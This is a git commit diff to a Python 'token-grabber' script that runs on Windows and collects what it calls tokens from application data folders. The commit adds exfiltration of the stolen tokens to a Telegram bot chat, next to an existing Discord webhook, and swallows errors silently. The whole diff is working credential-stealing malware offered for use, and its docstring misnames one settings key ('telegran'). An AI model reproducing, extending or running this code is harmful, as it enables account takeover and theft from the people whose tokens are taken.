18194880e79f91846f877bdc934e395d18aa81af
Sigma-cc <77269679+Sigma-cc@users.noreply.github.com>
2021-01-13 12:48:26 +0200

    update grabber
    Add "send to telegram"

--- token-grabber.py
+++ token-grabber.py
@@ -1,10 +1,21 @@
+
+#for send to discord
 PASTE_WEBHOOK_URL = 'PASTE_WEBHOOK_URL'
+
+#for send to telegram
+PASTE_BOT_TOKEN = ''
+PASTE_U_CHAT_ID = '' 
 
 import os
 if os.name != "nt": exit()
 import json
 import re
+
+#for send tokens to telegram
+import telegram
+#for send tokens to discord
 from urllib.request import Request, urlopen
+
 
 def GetTokens():
     local = os.getenv('LOCALAPPDATA')
@@ -36,15 +47,41 @@ def GetTokens():
             grabbed[platform] = tokens
     return grabbed 
 
-def SendTokensEmbed(webhook_url : str = None, grabbed : dict = None):
+def SendTokensEmbed(send_settings : dict, grabbed : dict = None):
+    """
+    how use
+    send_settings = {'discord' : 'webhook'} -> send tokens to discord
+    send_settings = {'telegran' : ['bot-token', 'chat-id']} -> 1 element - tokens, 2 - chat-id. send tokens to telegram.
+    send_settings = {'telegran' : ['bot-token', 'chat-id'], 'discord' : 'webhook'} -> send tokens to telegram and discord
+    """
     if not grabbed: grabbed = GetTokens()
-    embeds = [{'description' : ''}]
+    data = {}
+    data['discord'] = [{'description' : ''}]
+    data['telegram'] = ''
+
+    #generate message
     for app in list(grabbed.keys()):
-        embeds[0]['description'] += f'```diff\n+ Grabbed From {app}\n'+ '\n\n'.join(grabbed[app]) + '\n```'
-    if webhook_url:
-        send = Request(webhook_url, data=json.dumps({"embeds" : embeds}).encode(), headers={'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
-        urlopen(send)
-    return embeds
+        data['discord'][0]['description'] += f'\n```diff\n+ Grabbed From {app}\n'+ '\n\n'.join(grabbed[app]) + '\n```'
+        data['telegram'] += f'\n[Grabbed From {app}]\n'+ '\n\n'.join(grabbed[app]) + '\n'
+    #send message   
+    if 'discord' in list(send_settings.keys()):
+        urlopen(Request(send_settings['discord'], data=json.dumps({"embeds" : data['discord']}).encode(), headers={'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))
+    if 'telegram' in list(send_settings.keys()):
+        if len(send_settings['telegram']) == 2:
+            bot_token = send_settings['telegram'][0]
+            user_id = send_settings['telegram'][1]
+            sendMessage_telegramBot(bot_token, user_id, data['telegram'])
+
+    return data
+
+
+def sendMessage_telegramBot (bot_token, user_id, message):
+    try:
+        request = telegram.utils.request.Request(read_timeout=10)
+        bot = telegram.Bot(bot_token, request=request)
+        bot.send_message(chat_id=user_id, text=message)
+    except:
+        pass
 
 if __name__ == "__main__":
-    SendTokensEmbed(PASTE_WEBHOOK_URL)
+    SendTokensEmbed({'discord' : PASTE_WEBHOOK_URL, 'telegram' : [PASTE_BOT_TOKEN, PASTE_U_CHAT_ID]})
